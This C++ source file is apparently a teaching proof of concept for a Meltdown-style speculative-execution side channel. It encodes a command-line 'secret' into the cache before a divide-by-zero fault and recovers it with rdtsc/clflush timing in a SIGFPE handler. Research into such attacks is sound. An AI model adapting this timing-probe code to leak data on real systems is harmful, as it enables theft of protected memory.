#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <iostream>

using namespace std;

const size_t CACHE_LINE_SIZE = 4096;
const size_t MAX_SEND_VALUE = 8;

void setup_signal_handler();
int clear_cache();

volatile uint8_t *cache;

int probe(volatile uint8_t *addrs)
{
  volatile unsigned long time;
  asm __volatile__ (
    " mfence \n"
    " lfence \n"
    " rdtsc \n"
    " movl %%eax, %%esi \n"
    " movl (%1), %%eax \n"
    " lfence \n"
    " rdtsc \n"
    " subl %%esi, %%eax \n"
    " clflush 0(%1) \n"
    : "=a" (time)
    : "c" (addrs)
    : "%esi", "%edx"
  );
  return time;
}

void recovery_secret(int sig)
{
  int times[MAX_SEND_VALUE];
  for (int C = 0; C < MAX_SEND_VALUE; C++)
  {
    times[C] = probe(cache + CACHE_LINE_SIZE * C);
  }
  for (int C = 0; C < MAX_SEND_VALUE; C++)
  {
    cout << C << ": " << times[C] << endl;
  }
  exit(sig);
}

int speculative_transfer(int div, uint8_t secret)
{
  uint8_t data = 0;
  int res = 0;
  int a = div;
  for(int C = 0; C < 100000; C++)
  {
    a += C;
  }
  data = a / div;
  // The Speculative Part:
  res += cache[CACHE_LINE_SIZE * secret];
  return res + data;
}

int main(int argc, char *argv[])
{
  cout << "This'll be the first time you'd rather have AMD than intel..." << endl;
  cout << "Commencing the CPU melt!" << endl;
  
  //Setup cached memory
  cache = (volatile uint8_t*)aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE * MAX_SEND_VALUE);
  memset((void*)cache, 0, CACHE_LINE_SIZE * MAX_SEND_VALUE);
  setup_signal_handler();
  //Input Data
  char *p;
  int div = strtol(argv[1], &p, 10);
  uint8_t secret = (uint8_t) strtol(argv[2], &p, 10);
  cout << "div: " << div << ", secret: " << (int)secret << endl;
  //Run
  int result = clear_cache();
  result += speculative_transfer(div, secret);
  cout << "result: " << result << endl;
  recovery_secret(0);
  return result;
}

void setup_signal_handler()
{
  struct sigaction act;
  memset(&act, 0, sizeof(act));
  act.sa_handler = recovery_secret;
  sigset_t set;
  sigemptyset(&set);
  sigaddset(&set, SIGFPE);
  act.sa_mask = set;
  sigaction(SIGFPE, &act, 0);
}

int clear_cache()
{
  for(int C = 0; C < MAX_SEND_VALUE; C++)
  {
    __builtin_ia32_clflush((void*)cache + CACHE_LINE_SIZE * C);
  }
  return 0;
}
